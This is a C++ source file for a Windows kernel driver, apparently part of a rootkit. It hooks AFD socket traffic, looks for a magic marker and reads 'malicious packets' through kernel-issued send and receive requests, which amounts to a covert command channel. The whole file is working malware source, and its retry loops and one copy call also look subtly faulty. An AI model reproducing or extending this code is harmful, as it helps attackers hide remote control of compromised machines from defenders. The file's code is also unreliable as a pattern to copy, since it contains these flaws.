/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "PacketHandler.h"

/**
	Populate the necessary members in the PacketHandler class.
	@param SocketFileObject - The FILE_OBJECT of the Socket we're targetting.
	@param OriginalDeviceObject - The original Device for the Afd driver.
	@param RecvInformation - The passed AFD_RECV_INFO structure that contains important flags.
	@param RecvBuffer - The buffer that was recv'd.
	@param RecvBufferSize - The size in bytes of the RecvBuffer.
	@param MagicOffset - The offset for RecvBuffer where a PACKET_MAGIC was detected.
*/
PacketHandler::PacketHandler (
	_In_ PFILE_OBJECT SocketFileObject,
	_In_ PDEVICE_OBJECT OriginalDeviceObject,
	_In_ PAFD_RECV_INFO RecvInformation,
	_In_ PVOID RecvBuffer,
	_In_ ULONG RecvBufferSize,
	_In_ ULONG MagicOffset
	)
{
	this->Socket = SocketFileObject;
	this->AfdDevice = OriginalDeviceObject;
	this->AfdFlags = RecvInformation->AfdFlags;
	this->TdiFlags = RecvInformation->TdiFlags;
	this->Packet = RecvBuffer;
	this->PacketSize = RecvBufferSize;
	this->PacketMagicOffset = MagicOffset;
}

/**
	Send a synchronous IOCTL request to the Afd device.
	@param IoctlCode - The IOCTL code of the request.
	@param InputBuffer - The buffer to send.
	@param InputBufferSize - Size in bytes of the InputBuffer.
	@param IoStatusBlock - Status block returned by the IOCTL request.
	@return The status of the IOCTL operation.
*/
NTSTATUS
PacketHandler::SendSynchronousAfdRequest (
	_In_ ULONG IoctlCode,
	_In_ PVOID InputBuffer,
	_In_ ULONG InputBufferSize,
	_In_ PIO_STATUS_BLOCK IoStatusBlock
	)
{
	NTSTATUS status;
	HANDLE socketEventHandle;
	PIRP Irp;
	PIO_STACK_LOCATION irpStack;
	PKEVENT socketEvent;

	socketEventHandle = NULL;
	socketEvent = NULL;

	//
	// Create the event for the socket operation.
	//
	status = ZwCreateEvent(&socketEventHandle, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("PacketHandler!SendSynchronousAfdRequest: Failed to create the socket event with status 0x%X.", status);
		goto Exit;
	}

	//
	// Retrieve the event object.
	//
	status = ObReferenceObjectByHandle(socketEventHandle, EVENT_ALL_ACCESS, *ExEventObjectType, UserMode, RCAST<PVOID*>(&socketEvent), NULL);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("PacketHandler!SendSynchronousAfdRequest: Failed to reference the event object with status 0x%X.", status);
		goto Exit;
	}

	//
	// Allocate the IRP for the send request.
	//
	Irp = IoBuildDeviceIoControlRequest(IoctlCode, AfdDevice, InputBuffer, InputBufferSize, NULL, 0, FALSE, socketEvent, IoStatusBlock);

	//
	// This shouldn't be NULL, sanity check.
	//
	NT_ASSERT(Irp);

	if (Irp == NULL)
	{
		DBGPRINT("PacketHandler!SendSynchronousAfdRequest: Failed to build device Irp.");
		status = STATUS_NO_MEMORY;
		goto Exit;
	}

	//
	// Fill out missing properties in the IRP.
	//
	Irp->RequestorMode = UserMode;
	Irp->Tail.Overlay.OriginalFileObject = Socket;

	//
	// Fill out missing properties in the IRP's stack.
	//
	irpStack = IoGetNextIrpStackLocation(Irp);
	irpStack->FileObject = Socket;

	//
	// Sanity checks.
	//
	NT_ASSERT(irpStack->MajorFunction == IRP_MJ_DEVICE_CONTROL);

	IoStatusBlock->Status = STATUS_PENDING;

	//
	// Reference the FILE_OBJECT.
	//
	ObReferenceObject(Socket);

	//
	// Send the IRP.
	//
	status = IoCallDriver(AfdDevice, Irp);

	//
	// If the send is pending, wait.
	//
	if (status == STATUS_PENDING)
	{
		ZwWaitForSingleObject(socketEventHandle, TRUE, NULL);
		status = IoStatusBlock->Status;
	}

	//
	// Did we succeed?
	//
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("PacketHandler!SendSynchronousAfdRequest: Failed with status 0x%X.", status);
		goto Exit;
	}
Exit:
	if (socketEventHandle)
	{
		ZwClose(socketEventHandle);
	}
	return status;
}

/**
	Simulates WSPSend() and sends Buffer to the active Socket.
	@param Buffer - The buffer to send.
	@param BufferSize - The number of bytes in the buffer.
	@return Whether or not we were able to successfully send the bytes.
*/
BOOLEAN
PacketHandler::SendBuffer (
	_In_ CHAR* Buffer,
	_In_ SIZE_T BufferSize
	)
{
	NTSTATUS status;
	PAFD_SEND_INFO sendInfoUsermode;
	SIZE_T sendInfoSize;
	PAFD_WSABUF sendBuffersUsermode;
	SIZE_T sendBuffersSize;
	PCHAR usermodeBuffer;
	SIZE_T usermodeBufferSize;
	IO_STATUS_BLOCK dummyIOSB;

	sendInfoUsermode = NULL;
	usermodeBuffer = NULL;
	usermodeBufferSize = BufferSize;
	sendBuffersUsermode = NULL;
	sendInfoSize = sizeof(AFD_SEND_INFO);
	sendBuffersSize = sizeof(AFD_WSABUF);

	RtlZeroMemory(&dummyIOSB, sizeof(dummyIOSB));

	//
	// Since we're simulating a user-mode function, all buffers we give the Afd driver must be in user-mode memory space.
	//

	//
	// First allocate a buffer for the AFD_SEND_INFO structure.
	//
	status = ZwAllocateVirtualMemory(NtCurrentProcess(), RCAST<PVOID*>(&sendInfoUsermode), 0, &sendInfoSize, MEM_COMMIT, PAGE_READWRITE);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("PacketHandler!SendBuffer: Failed to allocate a user-mode buffer for the AFD_SEND_INFO structure with status 0x%X.", status);
		goto Exit;
	}

	//
	// Next allocate a buffer for the AFD_WSABUF structure.
	//
	status = ZwAllocateVirtualMemory(NtCurrentProcess(), RCAST<PVOID*>(&sendBuffersUsermode), 0, &sendBuffersSize, MEM_COMMIT, PAGE_READWRITE);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("PacketHandler!SendBuffer: Failed to allocate a user-mode buffer for the AFD_WSABUF structure with status 0x%X.", status);
		goto Exit;
	}

	//
	// Finally allocate a buffer for the buffer to send.
	//
	status = ZwAllocateVirtualMemory(NtCurrentProcess(), RCAST<PVOID*>(&usermodeBuffer), 0, &usermodeBufferSize, MEM_COMMIT, PAGE_READWRITE);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("PacketHandler!SendBuffer: Failed to allocate a user-mode buffer for the buffer to send with status 0x%X.", status);
		goto Exit;
	}

	//
	// Even though we allocated the memory, it's user-mode memory. We need to be careful.
	//
	__try
	{
		//
		// Copy data from the kernel-mode buffer to the user-mode buffer.
		//
		memcpy(usermodeBuffer, Buffer, BufferSize);

		//
		// Fill out the AFD_WSABUF buffer array.
		//
		sendBuffersUsermode->buf = usermodeBuffer;
		sendBuffersUsermode->len = SCAST<UINT>(BufferSize);

		//
		// Fill out the AFD_SEND_INFO structure.
		//
		sendInfoUsermode->BufferArray = sendBuffersUsermode;
		sendInfoUsermode->BufferCount = 1;
		//
		// Use the flags from the recv operation.
		//
		sendInfoUsermode->AfdFlags = AfdFlags;
		sendInfoUsermode->TdiFlags = TdiFlags;

		//
		// Send the request.
		//
		status = this->SendSynchronousAfdRequest(IOCTL_AFD_SEND, sendInfoUsermode, sizeof(AFD_SEND_INFO), &dummyIOSB);
	}
	__except (1)
	{
		DBGPRINT("PacketHandler!SendBuffer: Exception.");
		status = STATUS_BREAKPOINT;
	}
Exit:
	if (sendInfoUsermode)
	{
		sendInfoSize = 0;
		ZwFreeVirtualMemory(NtCurrentProcess(), RCAST<PVOID*>(&sendInfoUsermode), &sendInfoSize, MEM_RELEASE);
	}
	if (sendBuffersUsermode)
	{
		sendBuffersSize = 0;
		ZwFreeVirtualMemory(NtCurrentProcess(), RCAST<PVOID*>(&sendBuffersUsermode), &sendBuffersSize, MEM_RELEASE);
	}
	if (usermodeBuffer)
	{
		usermodeBufferSize = 0;
		ZwFreeVirtualMemory(NtCurrentProcess(), RCAST<PVOID*>(&usermodeBuffer), &usermodeBufferSize, MEM_RELEASE);
	}
	return NT_SUCCESS(status);
}

/**
	Simulates WSPRecv() and receives BufferSize bytes from the active Socket into Buffer.
	@param Buffer - The buffer that receives bytes read.
	@param BufferSize - The number of bytes in the buffer.
	@param BytesReceived - The number of bytes actually received.
	@return Whether or not we were able to successfully send the bytes.
*/
BOOLEAN
PacketHandler::ReceiveBuffer (
	_In_ CHAR* Buffer,
	_In_ SIZE_T BufferSize,
	_Inout_ ULONG* BytesReceived
	)
{
	NTSTATUS status;
	PAFD_RECV_INFO receiveInfoUsermode;
	SIZE_T receiveInfoSize;
	PAFD_WSABUF receiveBuffersUsermode;
	SIZE_T receiveBuffersSize;
	PCHAR usermodeBuffer;
	SIZE_T usermodeBufferSize;
	IO_STATUS_BLOCK dummyIOSB;

	receiveInfoUsermode = NULL;
	usermodeBuffer = NULL;
	usermodeBufferSize = BufferSize;
	receiveBuffersUsermode = NULL;
	receiveInfoSize = sizeof(AFD_RECV_INFO);
	receiveBuffersSize = sizeof(AFD_WSABUF);
	*BytesReceived = 0;

	//
	// Since we're simulating a user-mode function, all buffers we give the Afd driver must be in user-mode memory space.
	//

	//
	// First allocate a buffer for the AFD_receive_INFO structure.
	//
	status = ZwAllocateVirtualMemory(NtCurrentProcess(), RCAST<PVOID*>(&receiveInfoUsermode), 0, &receiveInfoSize, MEM_COMMIT, PAGE_READWRITE);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("AfdHook!receiveBuffer: Failed to allocate a user-mode buffer for the AFD_receive_INFO structure with status 0x%X.", status);
		goto Exit;
	}

	//
	// Next allocate a buffer for the AFD_WSABUF structure.
	//
	status = ZwAllocateVirtualMemory(NtCurrentProcess(), RCAST<PVOID*>(&receiveBuffersUsermode), 0, &receiveBuffersSize, MEM_COMMIT, PAGE_READWRITE);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("AfdHook!ReceiveBuffer: Failed to allocate a user-mode buffer for the AFD_WSABUF structure with status 0x%X.", status);
		goto Exit;
	}

	//
	// Finally allocate a buffer for the buffer to receive.
	//
	status = ZwAllocateVirtualMemory(NtCurrentProcess(), RCAST<PVOID*>(&usermodeBuffer), 0, &usermodeBufferSize, MEM_COMMIT, PAGE_READWRITE);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("AfdHook!ReceiveBuffer: Failed to allocate a user-mode buffer for the buffer to receive with status 0x%X.", status);
		goto Exit;
	}

	//
	// Even though we allocated the memory, it's user-mode memory. We need to be careful.
	//
	__try
	{
		//
		// Fill out the AFD_WSABUF buffer array.
		//
		receiveBuffersUsermode->buf = usermodeBuffer;
		receiveBuffersUsermode->len = SCAST<UINT>(BufferSize);

		//
		// Fill out the AFD_receive_INFO structure.
		//
		receiveInfoUsermode->BufferArray = receiveBuffersUsermode;
		receiveInfoUsermode->BufferCount = 1;
		receiveInfoUsermode->AfdFlags = AfdFlags;
		receiveInfoUsermode->TdiFlags = TdiFlags;

		//
		// Send the request.
		//
		status = this->SendSynchronousAfdRequest(IOCTL_AFD_RECV, receiveInfoUsermode, sizeof(AFD_RECV_INFO), &dummyIOSB);

		//
		// Copy data from the user-mode buffer to the kernel-mode buffer.
		//
		memcpy(Buffer, usermodeBuffer, BufferSize);

		*BytesReceived = SCAST<ULONG>(dummyIOSB.Information);
	}
	__except (1)
	{
		DBGPRINT("AfdHook!ReceiveBuffer: Exception.");
		status = STATUS_BREAKPOINT;
	}
Exit:
	if (receiveInfoUsermode)
	{
		receiveInfoSize = 0;
		ZwFreeVirtualMemory(NtCurrentProcess(), RCAST<PVOID*>(&receiveInfoUsermode), &receiveInfoSize, MEM_RELEASE);
	}
	if (receiveBuffersUsermode)
	{
		receiveBuffersSize = 0;
		ZwFreeVirtualMemory(NtCurrentProcess(), RCAST<PVOID*>(&receiveBuffersUsermode), &receiveBuffersSize, MEM_RELEASE);
	}
	if (usermodeBuffer)
	{
		usermodeBufferSize = 0;
		ZwFreeVirtualMemory(NtCurrentProcess(), RCAST<PVOID*>(&usermodeBuffer), &usermodeBufferSize, MEM_RELEASE);
	}
	return NT_SUCCESS(status);
}

/**
	Populate a base packet structure. If necessary, receive more bytes to populate entirely.
	@param PartialBasePacket - The base packet to populate.
	@param RemainingBytes - The number of bytes remaining after the base packet.
	@return Whether or not parsing was successful. Fails if cannot receive more bytes.
*/
BOOLEAN
PacketHandler::PopulateBasePacket (
	_Inout_ PBASE_PACKET PartialBasePacket,
	_Inout_ ULONG* RemainingBytes
	)
{
	ULONG bytesAfterMagic;
	ULONG bytesReceived;
	ULONG receiveRetryCount;

	//
	// Calculate the number of bytes AFTER the PACKET_MAGIC.
	//
	bytesAfterMagic = PacketSize - PacketMagicOffset - MAGIC_SIZE;
	*RemainingBytes = 0;
	receiveRetryCount = 0;

	//
	// Copy over what we can.
	//
	memcpy_s(PartialBasePacket,
			 sizeof(BASE_PACKET),
			 RCAST<PVOID>(RCAST<ULONG64>(Packet) + PacketMagicOffset + MAGIC_SIZE),
			 (bytesAfterMagic > sizeof(BASE_PACKET)) ? sizeof(BASE_PACKET) : bytesAfterMagic);

	DBGPRINT("PacketHandler!PopulateBasePacket: bytesAfterMagic = %u, PacketMagicOffset = %u, Packet = 0x%llx, PacketSize = %u, MAGIC_SIZE = %u.", bytesAfterMagic, PacketMagicOffset, Packet, PacketSize, MAGIC_SIZE);

	//
	// Check if we have enough bytes for a base packet.
	//
	if (bytesAfterMagic < sizeof(BASE_PACKET))
	{
		DBGPRINT("PacketHandler!PopulateBasePacket: Packet does not contain enough data for a base packet. Receiving the rest.");

		do
		{
			//
			// Receive the rest of the base packet.
			//
			if(this->ReceiveBuffer(RCAST<CHAR*>(RCAST<ULONG64>(PartialBasePacket) + bytesAfterMagic),
								   sizeof(BASE_PACKET) - bytesAfterMagic,
								   &bytesReceived) == FALSE)
			{
				DBGPRINT("PacketHandler!PopulateBasePacket: Failed to receive rest of base packet.");
				return FALSE;
			}
			bytesAfterMagic += bytesReceived;
			receiveRetryCount++;
		} while (bytesAfterMagic < sizeof(BASE_PACKET) || receiveRetryCount >= MaxReceiveRetry);

		//
		// If we failed to receive the rest of the BASE_PACKET after the maximum
		// amount of retries, return FALSE.
		//
		if (receiveRetryCount >= MaxReceiveRetry)
		{
			NT_ASSERT(FALSE);
			DBGPRINT("PacketHandler!PopulateBasePacket: Failed to receive base packet.");
			return FALSE;
		}

		DBGPRINT("PacketHandler!PopulateBasePacket: Received the rest of the base packet.");
	}
	//
	// If we have more space than a base packet, set the remaining bytes.
	//
	else
	{
		*RemainingBytes = bytesAfterMagic - sizeof(BASE_PACKET);
	}

	return TRUE;
}

/**
	Populate the rest of a malicious packet using a partial base packet.
	@param PartialBasePacket - Partial base packet containing only the BASE_PACKET structure.
	@param FullBasePacket - Caller allocated structure to populate with entire malicious packet.
	@param RemainingBytes - The number of bytes remaining after the BASE_PACKET.
	@return Whether or not we were able to successfully populate the rest of a malicious packet.
*/
BOOLEAN
PacketHandler::PopulateMaliciousPacket (
	_In_ PBASE_PACKET PartialBasePacket,
	_Inout_ PBASE_PACKET FullBasePacket,
	_In_ ULONG RemainingBytes
	)
{
	ULONG remainingMaliciousBytes;
	ULONG currentPacketOffset;
	ULONG bytesReceived;
	ULONG receiveRetryCount;

	receiveRetryCount = 0;

	//
	// First, copy the original base packet.
	//
	memcpy_s(FullBasePacket, PartialBasePacket->PacketLength, PartialBasePacket, sizeof(BASE_PACKET));
	remainingMaliciousBytes = PartialBasePacket->PacketLength - sizeof(BASE_PACKET);

	//
	// If we have more malicious bytes than necessary, copy those.
	//
	if (RemainingBytes)
	{
		memcpy_s(RCAST<PVOID>(RCAST<ULONG64>(FullBasePacket) + sizeof(BASE_PACKET)),
				 remainingMaliciousBytes,
				 RCAST<PVOID>(RCAST<ULONG64>(Packet) + PacketMagicOffset + sizeof(BASE_PACKET)),
				 RemainingBytes);

		//
		// Adjust the remaining packets appropriately.
		//
		if (RemainingBytes >= remainingMaliciousBytes)
		{
			remainingMaliciousBytes = 0;
		}
		else
		{
			remainingMaliciousBytes -= RemainingBytes;
		}
	}

	DBGPRINT("PacketHandler!ProcessMaliciousPacket: There are %i more bytes to receive.", remainingMaliciousBytes);

	//
	// If necessary, receive the remaining bytes.
	//
	if (remainingMaliciousBytes)
	{
		do
		{
			//
			// Calculate current offset by taking the number of remaining bytes after the
			// BASE_PACKET structure and subtracting the current number of remaining bytes.
			//
			currentPacketOffset = (PartialBasePacket->PacketLength - sizeof(BASE_PACKET)) - remainingMaliciousBytes;
			DBGPRINT("PacketHandler!ProcessMaliciousPacket: currentPacketOffset = %i, PartialBasePacket->PacketLength = %i, remainingMaliciousBytes = %i.", currentPacketOffset, PartialBasePacket->PacketLength, remainingMaliciousBytes);

			//
			// Receive the rest of the base packet.
			//
			if (this->ReceiveBuffer(RCAST<CHAR*>(RCAST<ULONG64>(FullBasePacket) + currentPacketOffset + sizeof(BASE_PACKET)),
									remainingMaliciousBytes,
									&bytesReceived) == FALSE)
			{
				DBGPRINT("PacketHandler!ProcessMaliciousPacket: Failed to receive rest of full packet.");
				return FALSE;
			}

			//
			// Subtract the number of bytes received from total count remaining.
			//
			remainingMaliciousBytes -= bytesReceived;
			receiveRetryCount++;
		} while (remainingMaliciousBytes > 0 || receiveRetryCount >= MaxReceiveRetry);

		//
		// If we failed to receive the rest of the BASE_PACKET after the maximum
		// amount of retries, return FALSE.
		//
		if (receiveRetryCount >= MaxReceiveRetry)
		{
			NT_ASSERT(FALSE);
			DBGPRINT("PacketHandler!ProcessMaliciousPacket: Failed to receive malicious packet.");
			return FALSE;
		}
	}

	return TRUE;
}

/**
	Process the malicious packet.
	@return Whether or not processing succeeded.
*/
BOOLEAN
PacketHandler::Process (
	VOID
	)
{
	BOOLEAN result;
	BASE_PACKET partialBasePacket;
	PBASE_PACKET fullBasePacket;
	ULONG remainingBytes;

	fullBasePacket = NULL;
	result = TRUE;

	//
	// Populate a partial base packet.
	//
	result = PopulateBasePacket(&partialBasePacket, &remainingBytes);
	if (result == FALSE)
	{
		DBGPRINT("PacketHandler!Process: Failed to parse a partial base packet.");
		goto Exit;
	}

	//
	// Allocate enough space for the full malicious packet.
	//
	fullBasePacket = RCAST<PBASE_PACKET>(ExAllocatePoolWithTag(NonPagedPool, partialBasePacket.PacketLength, MALICIOUS_PACKET_TAG));
	if (fullBasePacket == NULL)
	{
		DBGPRINT("PacketHandler!Process: Failed to allocate space for the full malicious packet with size %i.", partialBasePacket.PacketLength);
		goto Exit;
	}
	memset(fullBasePacket, 0, partialBasePacket.PacketLength);

	DBGPRINT("PacketHandler!Process: Received partial base packet with %i remaining bytes.", remainingBytes);

	//
	// Populate the full malicious packet.
	//
	result = PopulateMaliciousPacket(&partialBasePacket, fullBasePacket, remainingBytes);
	if (result == FALSE)
	{
		DBGPRINT("PacketHandler!Process: Failed to parse a full base packet.");
		goto Exit;
	}

	DBGPRINT("PacketHandler!Process: Received full packet with type %i.", fullBasePacket->Type);

Exit:
	if (fullBasePacket)
	{
		ExFreePoolWithTag(fullBasePacket, MALICIOUS_PACKET_TAG);
	}
	return result;
}